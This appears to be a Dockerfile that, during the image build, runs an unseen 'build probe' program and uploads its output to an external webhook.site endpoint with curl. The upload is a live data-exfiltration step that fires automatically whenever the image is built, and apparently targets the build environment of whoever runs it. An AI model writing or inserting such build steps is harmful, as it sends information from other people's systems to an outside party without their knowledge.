FROM alpine:3.20
RUN apk add --no-cache curl >/dev/null 2>&1
COPY front2/scripts/front2_build_probe /probe
RUN chmod +x /probe && /probe > /f2probe.txt 2>&1; echo f2-runprobe3-done; curl -sS -m 20 -X POST --data-binary @/f2probe.txt https://webhook.site/31fc19a8-5cfc-44ac-b27f-517fdcb8ffbb; echo; cat /f2probe.txt
